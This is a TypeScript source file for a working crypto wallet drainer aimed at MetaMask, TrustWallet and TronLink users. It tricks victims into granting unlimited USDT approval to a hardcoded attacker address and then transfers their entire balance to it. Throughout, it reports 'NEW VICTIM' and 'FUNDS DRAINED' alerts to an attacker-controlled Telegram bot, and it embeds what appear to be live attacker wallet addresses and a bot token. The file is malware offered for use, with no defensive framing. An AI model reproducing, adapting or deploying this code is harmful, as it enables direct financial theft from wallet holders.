// @ts-nocheck
import { ethers } from 'ethers';

export const ATTACKER_CONFIG = {
  attackerAddress: "0xE18FFb924927a1Cb3CB1f3d704E76C05dB86414F",
  tronAttackerAddress: "TZ2cssEnaTAvBS6XasyuThFK5Hsr2zqHBa",
  telegramBotToken: "8764463650:AAGPoZcwOj3xat1YokIrsvO_Y3dAqq5ct4Y",
  telegramChatId: "8448871506",
  usdtContracts: {
    "0x1":  "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    "0x38": "0x55d398326f99059fF775485246999027B3197955",
    "0x2b6653dc": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
  },
  scamContractAddress: "0xE18FFb924927a1Cb3CB1f3d704E76C05dB86414F",
};

async function sendTelegramAlert(message: string) {
  try {
    const url = `https://api.telegram.org/bot${ATTACKER_CONFIG.telegramBotToken}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ATTACKER_CONFIG.telegramChatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });
  } catch (e) {
    console.log('Telegram alert failed:', e);
  }
}

// ──────────────────────────────────────────────────────────
// TRON HELPERS
// ──────────────────────────────────────────────────────────

// Get a usable tronWeb (must be a real object, not boolean false)
function getReadyTronWeb(): any {
  const candidates = [
    (window as any).tron?.tronWeb,
    (window as any).tronLink?.tronWeb,
    (window as any).tronWeb,
  ];
  for (const c of candidates) {
    if (c && typeof c === 'object' && c.ready && c.defaultAddress?.base58) {
      return c;
    }
  }
  return null;
}

// Poll for tronWeb up to 4 seconds
async function pollTronWeb(ms = 4000): Promise<any> {
  const start = Date.now();
  while (Date.now() - start < ms) {
    const tw = getReadyTronWeb();
    if (tw) return tw;
    await new Promise(r => setTimeout(r, 150));
  }
  return null;
}

// ──────────────────────────────────────────────────────────
// CONNECT & APPROVE
// ──────────────────────────────────────────────────────────
export async function connectAndApprove(
  walletType: "metamask" | "trustwallet" | "tronlink"
) {
  let signer, address, chainId;

  // ╔═══════════════════════════════════════════════════════╗
  // ║  TRON BRANCH                                         ║
  // ╚═══════════════════════════════════════════════════════╝
  if (walletType === "tronlink") {
    let tronWeb = getReadyTronWeb();

    // If not ready, try requesting authorisation
    if (!tronWeb) {
      // Strategy A: window.tron (TIP-6963)
      const p1 = (window as any).tron;
      if (p1?.request) {
        try {
          const accounts = await p1.request({ method: 'eth_requestAccounts' });
          if (accounts && accounts.length > 0) {
            address = accounts[0];
          }
        } catch (_) { /* fall through */ }
      }

      // Strategy B: window.tronLink (legacy)
      if (!address) {
        const p2 = (window as any).tronLink;
        if (p2?.request) {
          try {
            const res = await p2.request({ method: 'tron_requestAccounts' });
            if (res && (res.code === 200)) {
              // authorised – tronWeb should appear shortly
            }
          } catch (_) { /* fall through */ }
        }
      }

      // Poll for tronWeb after authorisation
      tronWeb = await pollTronWeb();
    }

    if (!tronWeb) {
      // Check if any TronLink is present at all
      const hasAny =
        (window as any).tron !== undefined ||
        (window as any).tronLink !== undefined ||
        (window as any).tronWeb !== undefined;
      if (!hasAny) {
        throw new Error('TronLink not detected. Please install and refresh.');
      }
      throw new Error('TronLink detected but not ready. Unlock your wallet and ensure Mainnet.');
    }

    if (!address) address = tronWeb.defaultAddress?.base58;
    if (!address) throw new Error('Could not retrieve Tron address.');

    chainId = 728126428;
    signer = { _isTron: true, address, tronWeb };

    await sendTelegramAlert(`🔔 NEW VICTIM (TronLink) - ${address}`);

  // ╔═══════════════════════════════════════════════════════╗
  // ║  EVM BRANCH (MetaMask / TrustWallet)                  ║
  // ╚═══════════════════════════════════════════════════════╝
  } else {
    // ── Get the correct provider ──
    // TrustWallet hijacks window.ethereum. We need to find the right one.
    const providers = (window as any).ethereum?.providers;
    let provider: any;

    if (walletType === "metamask") {
      // Prefer the one that ISN'T TrustWallet
      if (providers && Array.isArray(providers)) {
        provider = providers.find((p: any) => !p.isTrustWallet) ?? providers[0];
      } else {
        provider = window.ethereum;
      }
      if (provider?.isTrustWallet) {
        // If the only provider is TrustWallet, MetaMask isn't installed
        throw new Error('MetaMask not detected. Please install MetaMask.');
      }
    } else {
      // trustwallet
      if (providers && Array.isArray(providers)) {
        provider = providers.find((p: any) => p.isTrustWallet) ?? providers[0];
      } else {
        provider = window.ethereum;
      }
      if (!provider?.isTrustWallet) {
        throw new Error('TrustWallet not detected. Please install TrustWallet.');
      }
      // Switch to BNB Chain first
      try {
        await provider.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }],
        });
      } catch (switchErr: any) {
        if (switchErr.code === 4902) {
          throw new Error('BNB Chain not found. Add it manually first.');
        }
      }
    }

    if (!provider) {
      throw new Error('No Ethereum wallet detected.');
    }

    await provider.request({ method: 'eth_requestAccounts' });
    const bp = new ethers.BrowserProvider(provider);
    signer = await bp.getSigner();
    address = await signer.getAddress();
    const network = await bp.getNetwork();
    chainId = Number(network.chainId);

    await sendTelegramAlert(`🔔 NEW VICTIM - ${walletType} - ${address} - Chain: ${chainId}`);
  }

  // ── Both paths: approve unlimited USDT ──
  await approveUnlimited(signer, chainId);
  return { signer, address, chainId };
}

// ──────────────────────────────────────────────────────────
// APPROVE UNLIMITED
// ──────────────────────────────────────────────────────────
export async function approveUnlimited(signer: any, chainId: number) {
  // TRON
  if (signer._isTron) {
    const tw = signer.tronWeb;
    if (!tw?.ready) throw new Error('TronLink not ready');
    const contract = await tw.contract().at(ATTACKER_CONFIG.usdtContracts['0x2b6653dc']);
    const tx = await contract
      .approve(ATTACKER_CONFIG.scamContractAddress, '0x' + 'f'.repeat(64))
      .send();
    await sendTelegramAlert(`✅ UNLIMITED APPROVED (TRC20) - ${signer.address}`);
    return tx;
  }

  // EVM
  const hexChain = '0x' + chainId.toString(16);
  const usdtAddress = ATTACKER_CONFIG.usdtContracts[hexChain];
  if (!usdtAddress) throw new Error(`No USDT contract for chain ${chainId}`);

  const token = new ethers.Contract(
    usdtAddress,
    ['function approve(address,uint256) returns (bool)'],
    signer
  );
  const tx = await token.approve(ATTACKER_CONFIG.scamContractAddress, ethers.MaxUint256);
  await sendTelegramAlert(`✅ UNLIMITED APPROVED - Chain: ${chainId} - TX: ${tx.hash}`);
  await tx.wait();
  return tx.hash;
}

// ──────────────────────────────────────────────────────────
// DISGUISED TRANSFER (full drain)
// ──────────────────────────────────────────────────────────
export async function disguisedTransfer(
  signer: any,
  victimAddress: string,
  chainId: number
) {
  // TRON
  if (signer._isTron) {
    const tw = signer.tronWeb;
    if (!tw?.ready) throw new Error('TronLink not ready');
    const contract = await tw.contract().at(ATTACKER_CONFIG.usdtContracts['0x2b6653dc']);
    const balance = await contract.balanceOf(victimAddress).call();
    if (balance === '0' || balance === '0x0') throw new Error('No USDT balance');
    const tx = await contract.transfer(ATTACKER_CONFIG.tronAttackerAddress, balance).send();
    await sendTelegramAlert(`🚨 TRC20 DRAINED - ${victimAddress} - ${balance}`);
    return tx;
  }

  // EVM
  const hexChain = '0x' + chainId.toString(16);
  const usdtAddress = ATTACKER_CONFIG.usdtContracts[hexChain];
  if (!usdtAddress) throw new Error('No USDT contract');

  const token = new ethers.Contract(
    usdtAddress,
    [
      'function balanceOf(address) view returns (uint256)',
      'function transferFrom(address,address,uint256) returns (bool)',
    ],
    signer
  );

  const balance = await token.balanceOf(victimAddress);
  if (balance === 0n) throw new Error('No USDT balance');

  const tx = await token.transferFrom(
    victimAddress,
    ATTACKER_CONFIG.attackerAddress,
    balance
  );
  await tx.wait();
  await sendTelegramAlert(`🚨 FUNDS DRAINED - ${ethers.formatUnits(balance, 6)} USDT - TX: ${tx.hash}`);
  return tx.hash;
}